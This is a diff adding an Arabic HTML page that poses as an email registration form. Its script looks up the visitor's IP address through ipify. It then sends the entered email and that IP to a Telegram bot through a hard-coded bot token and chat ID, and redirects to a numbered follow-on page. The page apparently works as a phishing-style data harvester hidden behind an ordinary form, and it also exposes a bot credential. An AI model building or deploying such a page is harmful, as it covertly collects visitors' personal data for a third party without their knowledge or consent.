@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل البريد الإلكتروني</title>
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: #f0f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+        }
+        h2 {
+            color: #0072ff;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: right;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #0072ff;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0072ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #005bb5;
+        }
+        .message {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #0072ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>أدخل بريدك الإلكتروني</h2>
+        <input type="email" id="email" placeholder="example@gmail.com" required>
+        <button onclick="submitEmail()">إرسال</button>
+        <p class="message" id="message"></p>
+    </div>
+
+    <script>
+        function submitEmail() {
+            let emailInput = document.getElementById("email");
+            let email = emailInput.value;
+            let message = document.getElementById("message");
+
+            if (!email.includes("@") || !email.includes(".")) {
+                message.innerText = "يرجى إدخال بريد إلكتروني صالح.";
+                message.style.color = "red";
+                return;
+            }
+
+            // الحصول على IP المستخدم
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    let userIP = data.ip;
+
+                    // بيانات بوت تيليجرام
+                    const botToken = "7896019095:AAHJqVnhO4dTY4152XZrA8yvFeDfLmmv-c8"; // ضع التوكن الخاص بك هنا
+                    const chatId = "6271227485"; // ضع معرف المجموعة أو المستخدم هنا
+                    const text = `📩 بريد إلكتروني جديد مسجل:\n\n✉️ *البريد:* ${email}\n🌍 *IP المستخدم:* ${userIP}`;
+
+                    // رابط API لإرسال البيانات
+                    const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    // إرسال البريد الإلكتروني وعنوان IP إلى تيليجرام
+                    fetch(telegramURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: "Markdown"
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            message.innerText = "تم إرسال البريد الإلكتروني بنجاح!";
+                            message.style.color = "green";
+                            emailInput.value = ""; // مسح الحقل بعد الإرسال
+
+                            // **تحويل المستخدم إلى صفحة أخرى بعد 2 ثانية**
+                            setTimeout(() => {
+                                window.location.href = "index7.html"; // استبدلها بالرابط المطلوب
+                            }, 2000);
+                        } else {
+                            message.innerText = "حدث خطأ، حاول مرة أخرى!";
+                            message.style.color = "red";
+                        }
+                    })
+                    .catch(error => {
+                        message.innerText = "فشل الاتصال بتيليجرام!";
+                        message.style.color = "red";
+                    });
+
+                })
+                .catch(error => {
+                    message.innerText = "فشل الحصول على عنوان IP!";
+                    message.style.color = "red";
+                });
+        }
+    </script>
+</body>
+</html>
